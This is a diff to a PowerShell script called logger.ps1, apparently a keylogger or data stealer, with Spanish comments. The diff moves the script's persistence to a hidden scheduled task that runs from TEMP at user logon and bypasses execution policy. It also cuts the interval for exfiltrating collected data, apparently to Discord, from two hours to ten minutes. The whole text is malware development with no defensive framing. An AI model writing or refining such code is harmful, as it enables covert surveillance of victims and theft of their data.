@@ -10,13 +10,13 @@ if (-not (Test-Path $logDir)) {
     New-Item -ItemType Directory -Path $logDir -Force | Out-Null
 }
 
-# REGISTRAR TAREA PROGRAMADA PARA PERSISTENCIA (SI NO EXISTE)
+# REGISTRAR TAREA PROGRAMADA PARA PERSISTENCIA (USUARIO ACTUAL)
 $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if (-not $task) {
-    $scriptPath = $MyInvocation.MyCommand.Path
+    $scriptPath = "$env:TEMP\logger.ps1"  # Usa la ruta conocida del script en TEMP
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-    $trigger = New-ScheduledTaskTrigger -AtStartup
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "Ejecuta logger.ps1 al inicio del sistema" -Force
+    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User $env:USERNAME -Description "Ejecuta logger.ps1 al iniciar sesión del usuario actual" -Force
 }
 
 # FUNCIÓN PARA ENVIAR DATOS A DISCORD
@@ -55,7 +55,7 @@ while ($true) {
         }
     }
 
-    # EXFILTRAR CADA 2 HORAS
+    # EXFILTRAR CADA 10 MINUTOS (ajustable a 120 más adelante)
     $now = Get-Date
     $lastSend = if (Test-Path $lastSendFile) { Get-Content $lastSendFile | Get-Date } else { $now.AddHours(-3) }
 
